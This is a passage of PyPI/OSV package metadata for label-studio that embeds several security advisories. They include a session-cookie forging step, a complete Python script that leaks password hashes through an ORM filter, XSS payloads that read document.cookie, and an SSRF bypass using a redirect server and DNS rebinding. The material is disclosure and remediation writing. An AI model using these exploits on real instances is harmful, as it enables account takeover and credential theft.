'_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"1.8.0":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: Apache Software License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":null,"project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.8.0/","requires_dist":["wheel (<=0.40.0,>=0.38.1)","appdirs (>=1.4.3)","attr (==0.3.1)","attrs (>=19.2.0)","pyyaml (>=5.3.1)","azure-storage-blob (>=12.6.0)","boto (~=2.49.0)","boto3 (~=1.16.28)","botocore (~=1.19.28)","bleach (~=5.0.0)","google-api-core (==2.11.0)","google-auth (==2.14.1)","google-cloud-appengine-logging (==1.1.0)","google-cloud-audit-log (==0.2.0)","google-cloud-core (==2.3.2)","google-cloud-storage (~=2.5.0)","google-cloud-logging (~=2.7.0)","google-resumable-media (==2.3.3)","googleapis-common-protos (==1.56.4)","grpc-google-iam-v1 (==0.12.4)","Django (==3.2.19)","django-storages (==1.12.3)","django-annoying (==0.10.6)","django-debug-toolbar (==3.2.1)","django-filter (==2.4.0)","django-model-utils (==4.1.1)","django-rq (==2.5.1)","django-cors-headers (==3.6.0)","django-extensions (==3.1.0)","django-rest-swagger (==2.2.0)","django-user-agents (==0.4.0)","django-ranged-fileresponse (>=0.1.2)","drf-dynamic-fields (==0.3.0)","djangorestframework (==3.13.1)","drf-flex-fields (==0.9.5)","drf-yasg (==1.20.0)","drf-generators (==0.3.0)","htmlmin (==0.1.12)","jsonschema (==3.2.0)","lockfile (>=0.12.0)","lxml (>=4.2.5)","defusedxml (>=0.7.1)","numpy (==1.21.6)","ordered-set (==4.0.2)","pandas (>=0.24.0)","protobuf (>=3.15.5)","psycopg2-binary (==2.9.6)","pydantic (<=1.11.0,>=1.7.3)","python-dateutil (==2.8.1)","pytz (~=2022.1)","requests (<=2.28,>=2.22.0)","rq (==1.10.1)","rules (==2.2)","ujson (>=3.0.0)","xmljson (==0.2.0)","colorama (>=0.4.4)","boxing (>=0.1.4)","redis (~=3.5)","sentry-sdk (>=1.1.0)","launchdarkly-server-sdk (==7.5.0)","python-json-logger (==2.0.4)","label-studio-converter (==0.0.53)","mysqlclient ; extra == 'mysql'"],"requires_python":">=3.6","summary":"Label Studio annotation tool","version":"1.8.0","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"9c399b814a9ac41d3288fdd24e0b42cb7b25ed6652c74f37990c73841e4f45fe","md5":"b95f007d250ef8e9927dd6b086796ed8","sha256":"4689ea176fb30cd1a10addd2298f19c39035c18a6c30f77e56c8b62560e5cdd6"},"downloads":-1,"filename":"label_studio-1.8.0-py3-none-any.whl","has_sig":false,"md5_digest":"b95f007d250ef8e9927dd6b086796ed8","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.6","size":52970453,"upload_time":"2023-06-05T23:14:37","upload_time_iso_8601":"2023-06-05T23:14:37.255803Z","url":"https://files.pythonhosted.org/packages/9c/39/9b814a9ac41d3288fdd24e0b42cb7b25ed6652c74f37990c73841e4f45fe/label_studio-1.8.0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"20f9c080934956e74afca4ab1a5c2b608963349a87dfa76b68bb6ebd0ed0984c","md5":"4997a31d34d57fee2ebc643b6eb16dff","sha256":"3406eed6304e255c0762a047662c7541063290caaf12094b9f4fea0b86e5db32"},"downloads":-1,"filename":"label-studio-1.8.0.tar.gz","has_sig":false,"md5_digest":"4997a31d34d57fee2ebc643b6eb16dff","packagetype":"sdist","python_version":"source","requires_python":">=3.6","size":51925218,"upload_time":"2023-06-05T23:14:45","upload_time_iso_8601":"2023-06-05T23:14:45.297505Z","url":"https://files.pythonhosted.org/packages/20/f9/c080934956e74afca4ab1a5c2b608963349a87dfa76b68bb6ebd0ed0984c/label-studio-1.8.0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, 